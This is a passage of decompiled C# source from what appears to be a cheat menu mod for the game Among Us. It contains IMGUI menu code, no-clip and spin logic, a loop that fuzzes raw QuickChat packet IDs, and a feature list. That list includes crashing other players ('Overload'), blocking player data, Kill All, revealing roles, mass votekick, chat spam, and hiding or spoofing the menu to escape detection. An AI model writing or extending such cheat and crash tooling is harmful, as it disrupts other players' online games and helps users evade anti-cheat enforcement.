            PlayerControl.LocalPlayer.NetTransform.RpcSnapTo(truePosition);
            this.attachUpdateTimer = 0.1f;
          }
          else
          {
            this.isAttachedToPlayer = false;
            this.attachedPlayerId = -1;
          }
        }
      }
      if (ChocooPlugin.BecomeImmortalEnabled != ChocooPlugin.lastImmortalState)
      {
        if (Object.op_Inequality((Object) PlayerControl.LocalPlayer, (Object) null) && Object.op_Inequality((Object) ShipStatus.Instance, (Object) null))
        {
          if (ChocooPlugin.BecomeImmortalEnabled && !PlayerControl.LocalPlayer.inVent)
            VentilationSystem.Update((VentilationSystem.Operation) 2, 50);
          else if (!ChocooPlugin.BecomeImmortalEnabled && !PlayerControl.LocalPlayer.inVent)
            VentilationSystem.Update((VentilationSystem.Operation) 3, 50);
        }
        ChocooPlugin.lastImmortalState = ChocooPlugin.BecomeImmortalEnabled;
      }
      if (this.rgbNameEnabled && (double) Time.time - (double) this.lastRgbNameUpdate >= (double) this.GetRgbUpdateInterval())
      {
        this.ApplyRgbNameToSelf();
        this.lastRgbNameUpdate = Time.time;
      }
      if (this.rgbNameToAllEnabled && Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null) && ((InnerNetClient) AmongUsClient.Instance).AmHost && (double) Time.time - (double) this.lastRgbNameToAllUpdate >= (double) this.GetRgbUpdateInterval())
      {
        this.ApplyRgbNameToAll();
        this.lastRgbNameToAllUpdate = Time.time;
      }
      if (this.rgbGradientMode >= 1)
      {
        ++this.rgbAnimationOffset;
        if (this.rgbAnimationOffset > 10000)
          this.rgbAnimationOffset = 0;
      }
      if ((double) this.blacklistMessageTimer > 0.0)
        this.blacklistMessageTimer -= Time.deltaTime;
      this.CleanupOldBlackoutTimestamps();
    }

    private static void UpdateVoteKickBadges()
    {
      if (Object.op_Equality((Object) VoteBanSystem.Instance, (Object) null))
        return;
      foreach (KeyValuePair<PlayerControl, TextMeshPro> keyValuePair in new Dictionary<PlayerControl, TextMeshPro>((IDictionary<PlayerControl, TextMeshPro>) ChocooPlugin.voteKickBadges))
      {
        if (Object.op_Equality((Object) keyValuePair.Key, (Object) null) || Object.op_Equality((Object) keyValuePair.Key.Data, (Object) null) || keyValuePair.Key.Data.Disconnected)
        {
          if (Object.op_Inequality((Object) keyValuePair.Value, (Object) null) && Object.op_Inequality((Object) ((Component) keyValuePair.Value).gameObject, (Object) null))
            Object.Destroy((Object) ((Component) keyValuePair.Value).gameObject);
          ChocooPlugin.voteKickBadges.Remove(keyValuePair.Key);
        }
      }
      foreach (PlayerControl allPlayerControl in PlayerControl.AllPlayerControls)
      {
        if (!Object.op_Equality((Object) allPlayerControl, (Object) null) && !Object.op_Equality((Object) allPlayerControl.cosmetics, (Object) null) && !Object.op_Equality((Object) allPlayerControl.cosmetics.nameText, (Object) null))
        {
          int clientIdByPlayer = ChocooPlugin.ChocooMenu.GetClientIdByPlayer(allPlayerControl);
          if (clientIdByPlayer >= 0)
          {
            int num = 0;
            Il2CppStructArray<int> il2CppStructArray;
            if (VoteBanSystem.Instance.Votes.TryGetValue(clientIdByPlayer, ref il2CppStructArray))
            {
              for (int index = 0; index < ((Il2CppArrayBase<int>) il2CppStructArray).Length; ++index)
              {
                if (((Il2CppArrayBase<int>) il2CppStructArray)[index] != 0)
                  ++num;
              }
            }
            TextMeshPro textMeshPro;
            if (!ChocooPlugin.voteKickBadges.TryGetValue(allPlayerControl, out textMeshPro) || Object.op_Equality((Object) textMeshPro, (Object) null))
            {
              GameObject gameObject = new GameObject("VoteKickBadge");
              gameObject.transform.SetParent(allPlayerControl.cosmetics.nameText.transform);
              gameObject.transform.localPosition = new Vector3(0.0f, -0.3f, 0.0f);
              gameObject.transform.localScale = Vector3.op_Multiply(Vector3.one, 1f);
              textMeshPro = gameObject.AddComponent<TextMeshPro>();
              ((TMP_Text) textMeshPro).fontSize = 2f;
              ((TMP_Text) textMeshPro).alignment = (TextAlignmentOptions) 514;
              textMeshPro.sortingOrder = 11;
              ((TMP_Text) textMeshPro).fontStyle = (FontStyles) 1;
              if (Object.op_Inequality((Object) ((TMP_Text) allPlayerControl.cosmetics.nameText).font, (Object) null))
                ((TMP_Text) textMeshPro).font = ((TMP_Text) allPlayerControl.cosmetics.nameText).font;
              ChocooPlugin.voteKickBadges[allPlayerControl] = textMeshPro;
            }
            ((Component) textMeshPro).gameObject.SetActive(true);
            if (num >= 3)
              ((TMP_Text) textMeshPro).text = "<color=red>KICKED</color>";
            else if (num == 2)
              ((TMP_Text) textMeshPro).text = "<color=red>2/3</color>";
            else if (num == 1)
              ((TMP_Text) textMeshPro).text = "<color=orange>1/3</color>";
            else
              ((TMP_Text) textMeshPro).text = "<color=green>0/3</color>";
          }
        }
      }
    }

    private static int GetClientIdByPlayer(PlayerControl player)
    {
      if (Object.op_Equality((Object) player, (Object) null) || Object.op_Equality((Object) AmongUsClient.Instance, (Object) null))
        return -1;
      foreach (ClientData allClient in ((InnerNetClient) AmongUsClient.Instance).allClients)
      {
        if (allClient != null && Object.op_Inequality((Object) allClient.Character, (Object) null) && (int) allClient.Character.PlayerId == (int) player.PlayerId)
          return allClient.Id;
      }
      return -1;
    }

    private void AutoTestQuickChatIds()
    {
      try
      {
        if (Time.frameCount % 120 != 0)
          return;
        if (ChocooPlugin.ChocooMenu.testIdCounter < 2000)
        {
          ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) ChocooPlugin.ChocooMenu.testIdCounter);
          ChocooPlugin.Logger.LogInfo((object) ("Testing QuickChat ID: " + ChocooPlugin.ChocooMenu.testIdCounter.ToString()));
          ++ChocooPlugin.ChocooMenu.testIdCounter;
        }
        else
        {
          ChocooPlugin.ChocooMenu.autoTesting = false;
          ChocooPlugin.ChocooMenu.testIdCounter = 0;
          ChocooPlugin.Logger.LogInfo((object) "Auto-test complete!");
          if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) && Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Chat, (Object) null))
            DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, "<color=green>[QuickChat Tester]</color> Test complete! Check logs for results.", true);
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Auto-test error: " + ex.Message));
      }
    }

    private void CleanupOldBlackoutTimestamps()
    {
      try
      {
        float currentTime = Time.time;
        foreach (string key in ChocooPlugin.blackoutTimestamps.Where<KeyValuePair<string, float>>((Func<KeyValuePair<string, float>, bool>) (kvp => (double) currentTime - (double) kvp.Value > 7.0)).Select<KeyValuePair<string, float>, string>((Func<KeyValuePair<string, float>, string>) (kvp => kvp.Key)).ToList<string>())
        {
          ChocooPlugin.blackoutTimestamps.Remove(key);
          ChocooPlugin.blackoutedPlayers.Remove(key);
        }
      }
      catch
      {
      }
    }

    private void FixedUpdate()
    {
      if (Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null) || Object.op_Equality((Object) PlayerControl.LocalPlayer.MyPhysics, (Object) null))
        return;
      PlayerControl localPlayer = PlayerControl.LocalPlayer;
      Collider2D component = ((Component) localPlayer.MyPhysics).GetComponent<Collider2D>();
      if (Object.op_Inequality((Object) component, (Object) null))
        ((Behaviour) component).enabled = !ChocooPlugin.NoClipEnabled;
      if (ChocooPlugin.SpinEnabled)
      {
        ChocooPlugin.spinAngle += 15f;
        ((Component) localPlayer).transform.localRotation = Quaternion.Euler(0.0f, 0.0f, ChocooPlugin.spinAngle);
      }
      if (ChocooPlugin.RandomizeOutfit && ((InnerNetClient) AmongUsClient.Instance).AmHost && (double) Time.time > (double) ChocooPlugin.nextRandomTime)
      {
        ChocooPlugin.nextRandomTime = Time.time + 0.1f;
        this.RandomizeEverything(localPlayer);
      }
      if ((double) ChocooPlugin.exitTimeForRejoin < 0.0 || (double) Time.time < (double) ChocooPlugin.exitTimeForRejoin || !((InnerNetObject) PlayerControl.LocalPlayer).AmOwner)
        return;
      ChocooPlugin.exitTimeForRejoin = -1f;
      int storedGameIdForRejoin = ChocooPlugin.storedGameIdForRejoin;
      ChocooPlugin.storedGameIdForRejoin = 0;
      try
      {
        AmongUsClient.Instance.ExitGame((DisconnectReasons) 209);
        if (storedGameIdForRejoin != 0)
          ((MonoBehaviour) AmongUsClient.Instance).StartCoroutine(AmongUsClient.Instance.CoJoinOnlineGameFromCode(storedGameIdForRejoin, false));
      }
      catch
      {
      }
    }

    private void OnGUI()
    {
      ChocooPlugin.colorLocked = false;
      if (this._styleSettingsNormal == null)
      {
        this._styleSettingsNormal = new GUIStyle(GUI.skin.label)
        {
          fontSize = 11,
          alignment = (TextAnchor) 3,
          normal = new GUIStyleState()
          {
            textColor = Color.white
          }
        };
        this._styleSettingsFocused = new GUIStyle(GUI.skin.label)
        {
          fontSize = 11,
          alignment = (TextAnchor) 3,
          normal = new GUIStyleState()
          {
            textColor = Color.yellow
          }
        };
      }
      if (!ChocooPlugin.ShowMenu)
        return;
      GUI.skin.label.fontSize = ChocooPlugin.MenuFontSize;
      GUI.skin.button.fontSize = ChocooPlugin.MenuFontSize;
      GUI.skin.toggle.fontSize = ChocooPlugin.MenuFontSize;
      this.HandleResize();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      float num1 = Mathf.SmoothStep(0.0f, 1f, this.menuAnimationProgress);
      if ((double) num1 > 0.0099999997764825821)
      {
        Color color = GUI.color;
        GUI.color = new Color(1f, 1f, 1f, num1);
        Matrix4x4 matrix = GUI.matrix;
        Vector2 vector2;
        // ISSUE: explicit constructor call
        ((Vector2) ref vector2).\u002Ector(((Rect) ref this.windowRect).x + ((Rect) ref this.windowRect).width / 2f, ((Rect) ref this.windowRect).y + ((Rect) ref this.windowRect).height / 2f);
        float num2 = Mathf.Max(num1, 0.01f);
        GUIUtility.ScaleAroundPivot(new Vector2(num2, num2), vector2);
        this.windowRect = GUI.Window(this.windowId, this.windowRect, GUI.WindowFunction.op_Implicit(new Action<int>(this.DrawWindowContents)), "");
        GUI.matrix = matrix;
        GUI.color = color;
      }
      this.DrawResizeHandle();
      if (this.chatBoxFocused && Event.current.type == 0 && !((Rect) ref this.windowRect).Contains(Event.current.mousePosition))
        this.chatBoxFocused = false;
      if (this.searchBoxFocused && Event.current.type == 0)
      {
        Rect rect;
        // ISSUE: explicit constructor call
        ((Rect) ref rect).\u002Ector(((Rect) ref this.windowRect).x + 10f, ((Rect) ref this.windowRect).y + 45f, 250f, 230f);
        if (!((Rect) ref rect).Contains(Event.current.mousePosition))
        {
          this.searchBoxFocused = false;
          this.searchResults.Clear();
        }
      }
      if (this.settingsBoxFocused && Event.current.type == 0 && !((Rect) ref this.windowRect).Contains(Event.current.mousePosition))
      {
        this.ApplySettingInput(this.focusedSettingKey, this.settingInputBuffer);
        this.focusedSettingKey = "";
        this.settingInputBuffer = "";
        this.settingsBoxFocused = false;
      }
      if (this.forceNameBoxFocused && Event.current.type == 0 && !((Rect) ref this.windowRect).Contains(Event.current.mousePosition))
        this.forceNameBoxFocused = false;
      if (this.fpsInputFocused && Event.current.type == 0 && !((Rect) ref this.windowRect).Contains(Event.current.mousePosition))
        this.fpsInputFocused = false;
      if (this.levelInputFocused && Event.current.type == 0 && !((Rect) ref this.windowRect).Contains(Event.current.mousePosition))
        this.levelInputFocused = false;
      if (!this.customPlatformInputFocused || Event.current.type != 0 || ((Rect) ref this.customPlatformInputRect).Contains(Event.current.mousePosition))
        return;
      this.customPlatformInputFocused = false;
    }

    private void DrawWindowContents(int id)
    {
      Color rgbColor = ChocooPlugin.GetRGBColor();
      Color backgroundColor = GUI.backgroundColor;
      GUI.backgroundColor = new Color(rgbColor.r, rgbColor.g, rgbColor.b, ChocooPlugin.MenuOpacity);
      GUI.Box(new Rect(0.0f, 0.0f, ((Rect) ref this.windowRect).width, ((Rect) ref this.windowRect).height), "", new GUIStyle(GUI.skin.window));
      GUI.backgroundColor = backgroundColor;
      GUILayout.BeginArea(new Rect(10f, 10f, ((Rect) ref this.windowRect).width - 20f, 30f));
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Label("chocoomenu v1.0.8 _dev2", new GUIStyle(GUI.skin.label)
      {
        fontSize = 16 /*0x10*/,
        fontStyle = (FontStyle) 1,
        alignment = (TextAnchor) 4
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.EndArea();
      this.DrawSearchBar();
      this.DrawSidebar();
      if (!this.searchBoxFocused || string.IsNullOrEmpty(this.searchQuery))
        this.DrawMainContent();
      else
        this.DrawSearchResults();
      GUILayout.BeginArea(new Rect(10f, ((Rect) ref this.windowRect).height - 30f, ((Rect) ref this.windowRect).width - 20f, 25f));
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : Color.gray;
      GUILayout.Label($"Press {ChocooPlugin.MenuKey.Value.ToString()} to hide", new GUIStyle(GUI.skin.label)
      {
        alignment = (TextAnchor) 4
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = Color.white;
      GUILayout.EndArea();
      this.resizeHandleRect = new Rect(((Rect) ref this.windowRect).width - 15f, ((Rect) ref this.windowRect).height - 15f, 15f, 15f);
      if (this.isResizing || ((Rect) ref this.resizeHandleRect).Contains(Event.current.mousePosition))
        return;
      GUI.DragWindow();
    }

    private void DrawSearchBar()
    {
      float num1 = 10f;
      float num2 = 45f;
      float num3 = 90f;
      float num4 = 30f;
      GUILayout.BeginArea(new Rect(num1, num2, num3, num4));
      GUI.backgroundColor = new Color(0.2f, 0.2f, 0.2f, 1f);
      Rect rect1;
      // ISSUE: explicit constructor call
      ((Rect) ref rect1).\u002Ector(0.0f, 0.0f, num3, num4);
      GUI.Box(rect1, "", GUI.skin.box);
      if (GUI.Button(rect1, "", GUIStyle.none))
      {
        this.searchBoxFocused = true;
        this.searchCursorVisible = true;
        this.searchCursorBlinkTime = 0.0f;
      }
      Rect rect2;
      // ISSUE: explicit constructor call
      ((Rect) ref rect2).\u002Ector(((Rect) ref rect1).x + 5f, ((Rect) ref rect1).y + 6f, ((Rect) ref rect1).width - 10f, ((Rect) ref rect1).height - 12f);
      GUIStyle guiStyle = new GUIStyle(GUI.skin.label)
      {
        fontSize = 10,
        alignment = (TextAnchor) 3,
        normal = new GUIStyleState()
        {
          textColor = Color.white
        }
      };
      string str = this.searchQuery;
      if (this.searchBoxFocused && this.searchCursorVisible && this.searchCursorPosition >= 0 && this.searchCursorPosition <= this.searchQuery.Length)
        str = this.searchQuery.Insert(this.searchCursorPosition, "|");
      if (string.IsNullOrEmpty(this.searchQuery) && !this.searchBoxFocused)
      {
        GUI.contentColor = Color.gray;
        GUI.Label(rect2, "Search...", guiStyle);
        GUI.contentColor = ChocooPlugin.GetRGBText();
      }
      else
        GUI.Label(rect2, str, guiStyle);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      if (this.searchBoxFocused && !string.IsNullOrEmpty(this.searchQuery))
        this.PerformSearch();
      GUILayout.EndArea();
    }

    private void DrawSearchResults()
    {
      GUILayout.BeginArea(new Rect(110f, 85f, ((Rect) ref this.windowRect).width - 120f, ((Rect) ref this.windowRect).height - 125f));
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Label("Search Results", new GUIStyle(GUI.skin.label)
      {
        fontSize = 14,
        fontStyle = (FontStyle) 1,
        alignment = (TextAnchor) 3
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Space(10f);
      if (this.searchResults.Count > 0)
      {
        this.scrollPosition = GUILayout.BeginScrollView(this.scrollPosition, (Il2CppReferenceArray<GUILayoutOption>) null);
        foreach (ChocooPlugin.ChocooMenu.SearchResult searchResult in this.searchResults)
        {
          GUI.backgroundColor = new Color(0.2f, 0.2f, 0.2f, 0.95f);
          GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
          GUI.contentColor = ChocooPlugin.GetRGBText();
          GUILayout.Label(searchResult.featureName, new GUIStyle(GUI.skin.label)
          {
            fontSize = 12,
            fontStyle = (FontStyle) 1
          }, (Il2CppReferenceArray<GUILayoutOption>) null);
          GUI.contentColor = Color.gray;
          GUILayout.Label("Tab: " + searchResult.tabName, new GUIStyle(GUI.skin.label)
          {
            fontSize = 10
          }, (Il2CppReferenceArray<GUILayoutOption>) null);
          GUILayout.Label(searchResult.description, new GUIStyle(GUI.skin.label)
          {
            fontSize = 10,
            wordWrap = true
          }, (Il2CppReferenceArray<GUILayoutOption>) null);
          GUILayout.Space(5f);
          GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
          if (GUILayout.Button($"Go to {searchResult.tabName} Tab", new GUILayoutOption[1]
          {
            GUILayout.Height(25f)
          }))
          {
            ChocooPlugin.ActiveTab = searchResult.tabName;
            try
            {
              FieldInfo field1 = typeof (ChocooPlugin).GetField("targetTab", BindingFlags.Static | BindingFlags.NonPublic);
              FieldInfo field2 = typeof (ChocooPlugin).GetField("tabTransitionProgress", BindingFlags.Static | BindingFlags.NonPublic);
              if (field1 != (FieldInfo) null)
                field1.SetValue((object) null, (object) searchResult.tabName);
              if (field2 != (FieldInfo) null)
                field2.SetValue((object) null, (object) 0.0f);
            }
            catch
            {
            }
            this.searchQuery = "";
            this.searchBoxFocused = false;
            this.searchResults.Clear();
          }
          GUI.backgroundColor = ChocooPlugin.GetRGBColor();
          GUILayout.EndVertical();
          GUILayout.Space(5f);
        }
        GUILayout.EndScrollView();
      }
      else
      {
        GUILayout.FlexibleSpace();
        GUI.contentColor = Color.gray;
        GUILayout.Label($"No features found matching '{this.searchQuery}'", new GUIStyle(GUI.skin.label)
        {
          fontSize = 11,
          alignment = (TextAnchor) 4,
          fontStyle = (FontStyle) 2,
          wordWrap = true
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUILayout.Space(10f);
        GUILayout.Label("Try searching for:", new GUIStyle(GUI.skin.label)
        {
          fontSize = 10,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUILayout.Label("• Feature names (e.g., 'No Clip', 'God Mode')\n• Tab names (e.g., 'Host', 'Self')\n• Descriptions (e.g., 'kill', 'teleport')", new GUIStyle(GUI.skin.label)
        {
          fontSize = 9,
          alignment = (TextAnchor) 4,
          wordWrap = true
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
        GUILayout.FlexibleSpace();
      }
      GUILayout.EndArea();
    }

    private void PerformSearch()
    {
      this.searchResults.Clear();
      string lower = this.searchQuery.ToLower();
      foreach (ChocooPlugin.ChocooMenu.SearchResult searchResult in new List<ChocooPlugin.ChocooMenu.SearchResult>()
      {
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Kill Cooldown",
          tabName = "Self",
          description = "Show kill timer overlay"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Kill Notification",
          tabName = "Self",
          description = "Get notified of kills"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "No Clip",
          tabName = "Self",
          description = "Walk through walls"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Spin",
          tabName = "Self",
          description = "Spin your character"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Show Player Info",
          tabName = "Self",
          description = "Display player details"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Anti-Exploits",
          tabName = "Self",
          description = "Block RPC attacks and exploits"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "See Ghosts",
          tabName = "Self",
          description = "See dead players"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Reveal Roles",
          tabName = "Self",
          description = "See everyone's role"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Reveal Votes",
          tabName = "Self",
          description = "See votes in meetings"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Dark Mode",
          tabName = "Self",
          description = "Enable dark theme"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "See Mod Users",
          tabName = "Self",
          description = "Detect other mod users"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Show Host",
          tabName = "Self",
          description = "Display host name"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Emergency Meeting",
          tabName = "Game",
          description = "Force emergency meeting"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Complete Tasks",
          tabName = "Game",
          description = "Auto-complete all tasks"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Game Speed",
          tabName = "Game",
          description = "Adjust game speed"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Scanner Animation",
          tabName = "Game",
          description = "Show scan effect"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Force Roles",
          tabName = "Host",
          description = "Assign roles to players"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Force Color",
          tabName = "Host",
          description = "Change player colors"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "God Mode",
          tabName = "Host",
          description = "Become unkillable"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Disable Votekicks",
          tabName = "Host",
          description = "Block votekick attempts"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Disable Meetings",
          tabName = "Host",
          description = "Block emergency meetings"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Kick Player",
          tabName = "Host",
          description = "Kick selected player"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Ban Player",
          tabName = "Host",
          description = "Ban selected player"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Kill All",
          tabName = "Host",
          description = "Kill everyone instantly"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Reactor",
          tabName = "Sabotages",
          description = "Trigger reactor sabotage"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Oxygen",
          tabName = "Sabotages",
          description = "Trigger O2 sabotage"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Lights",
          tabName = "Sabotages",
          description = "Turn off lights"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Comms",
          tabName = "Sabotages",
          description = "Break communications"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Close Doors",
          tabName = "Sabotages",
          description = "Lock all doors"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Overload",
          tabName = "Destruct",
          description = "Crash other players"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Overflow",
          tabName = "Destruct",
          description = "Block player data"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Hide from Host",
          tabName = "Destruct",
          description = "Teleport far away"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Manual Chat",
          tabName = "Chat",
          description = "Send custom messages"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Spam Chat",
          tabName = "Chat",
          description = "Auto-spam messages"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Whisper",
          tabName = "Chat",
          description = "Private message player"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Weird Chat",
          tabName = "Chat",
          description = "Send funny messages"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Coloured Chat",
          tabName = "Chat",
          description = "Send colored text"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Anticheat",
          tabName = "Anticheat",
          description = "Enable cheat detection"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Auto-Ban",
          tabName = "Anticheat",
          description = "Auto-ban cheaters"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Blacklist",
          tabName = "Anticheat",
          description = "Manage banned players"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Fake Role",
          tabName = "Roles",
          description = "Change your visible role"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Engineer Cheats",
          tabName = "Roles",
          description = "Unlimited vent time"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Scientist Cheats",
          tabName = "Roles",
          description = "Unlimited vitals"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Impostor Cheats",
          tabName = "Roles",
          description = "Unlimited kill range"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Spawn Lobby",
          tabName = "Map",
          description = "Create lobby instance"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Spawn Map",
          tabName = "Map",
          description = "Load game map"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Votekick All",
          tabName = "Votekick",
          description = "Mass votekick players"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Find Daters",
          tabName = "No Dating",
          description = "Filter dating lobbies"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Extended Lobby",
          tabName = "No Dating",
          description = "Show more lobbies"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "RGB Mode",
          tabName = "About",
          description = "Rainbow menu colors"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Hide Menu Usage to Others",
          tabName = "About",
          description = "Hide menu RPC"
        },
        new ChocooPlugin.ChocooMenu.SearchResult()
        {
          featureName = "Spoof Menu",
          tabName = "About",
          description = "Fake other menus"
        }
      })
      {
        if (searchResult.featureName.ToLower().Contains(lower) || searchResult.description.ToLower().Contains(lower) || searchResult.tabName.ToLower().Contains(lower))
          this.searchResults.Add(searchResult);
      }
      if (this.searchResults.Count <= 5)
        return;
      this.searchResults = this.searchResults.GetRange(0, 5);
    }

    private void DrawSidebar()
    {
      float num1 = 90f;
      float num2 = 10f;
      float num3 = 85f;
      float num4 = ((Rect) ref this.windowRect).height - 125f;
      GUILayout.BeginArea(new Rect(num2, num3, num1, num4));
      if (this.DrawTabButton("About", ChocooPlugin.ActiveTab == "About"))
        ChocooPlugin.ActiveTab = "About";
      GUILayout.Space(5f);
      if (this.DrawTabButton("Game", ChocooPlugin.ActiveTab == "Game"))
        ChocooPlugin.ActiveTab = "Game";
      GUILayout.Space(5f);
      if (this.DrawTabButton("Self", ChocooPlugin.ActiveTab == "Self"))
        ChocooPlugin.ActiveTab = "Self";
      GUILayout.Space(5f);
      if (this.DrawTabButton("Settings", ChocooPlugin.ActiveTab == "Settings"))
        ChocooPlugin.ActiveTab = "Settings";
      GUILayout.Space(5f);
      if (this.DrawTabButton("Map", ChocooPlugin.ActiveTab == "Map"))
        ChocooPlugin.ActiveTab = "Map";
      GUILayout.Space(5f);
      if (this.DrawTabButton("Roles", ChocooPlugin.ActiveTab == "Roles"))
        ChocooPlugin.ActiveTab = "Roles";
      GUILayout.Space(5f);
      if (this.DrawTabButton("Sabotages", ChocooPlugin.ActiveTab == "Sabotages"))
        ChocooPlugin.ActiveTab = "Sabotages";
      GUILayout.Space(5f);
      if (this.DrawTabButton("Host", ChocooPlugin.ActiveTab == "Host"))
        ChocooPlugin.ActiveTab = "Host";
      GUILayout.Space(5f);
      if (this.DrawTabButton("Players", ChocooPlugin.ActiveTab == "Players"))
        ChocooPlugin.ActiveTab = "Players";
      GUILayout.Space(5f);
      if (this.DrawTabButton("Destruct", ChocooPlugin.ActiveTab == "Destruct"))
        ChocooPlugin.ActiveTab = "Destruct";
      GUILayout.Space(5f);
      if (this.DrawTabButton("No Dating", ChocooPlugin.ActiveTab == "No Dating"))
        ChocooPlugin.ActiveTab = "No Dating";
      GUILayout.Space(5f);
      if (this.DrawTabButton("Chat", ChocooPlugin.ActiveTab == "Chat"))
        ChocooPlugin.ActiveTab = "Chat";
      GUILayout.Space(5f);
      if (this.DrawTabButton("Anticheat", ChocooPlugin.ActiveTab == "Anticheat"))
        ChocooPlugin.ActiveTab = "Anticheat";
      GUILayout.EndArea();
    }

    private bool DrawTabButton(string label, bool isActive)
    {
      Color backgroundColor = GUI.backgroundColor;
      Rect rect = GUILayoutUtility.GetRect(GUIContent.none, GUI.skin.button, new GUILayoutOption[1]
      {
        GUILayout.Height(31f)
      });
      bool flag1 = ((Rect) ref rect).Contains(Event.current.mousePosition);
      if (flag1 && Event.current.type == 7)
        this.hoveredTab = label;
      else if (this.hoveredTab == label && !flag1 && Event.current.type == 7)
        this.hoveredTab = "";
      Color color;
      if (isActive)
      {
        if (ChocooPlugin.RGBMode)
        {
          Color rgbColor = ChocooPlugin.GetRGBColor();
          rgbColor.r = Mathf.Min(rgbColor.r + 0.2f, 1f);
          rgbColor.g = Mathf.Min(rgbColor.g + 0.2f, 1f);
          rgbColor.b = Mathf.Min(rgbColor.b + 0.2f, 1f);
          color = rgbColor;
        }
        else
        {
          // ISSUE: explicit constructor call
          ((Color) ref color).\u002Ector(0.4f, 0.2f, 0.6f, 1f);
        }
      }
      else if (flag1 && !isActive)
      {
        if (ChocooPlugin.RGBMode)
        {
          Color rgbColor = ChocooPlugin.GetRGBColor();
          rgbColor.r = Mathf.Min(rgbColor.r * 0.4f, 1f);
          rgbColor.g = Mathf.Min(rgbColor.g * 0.4f, 1f);
          rgbColor.b = Mathf.Min(rgbColor.b * 0.4f, 1f);
          color = rgbColor;
        }
        else
        {
          // ISSUE: explicit constructor call
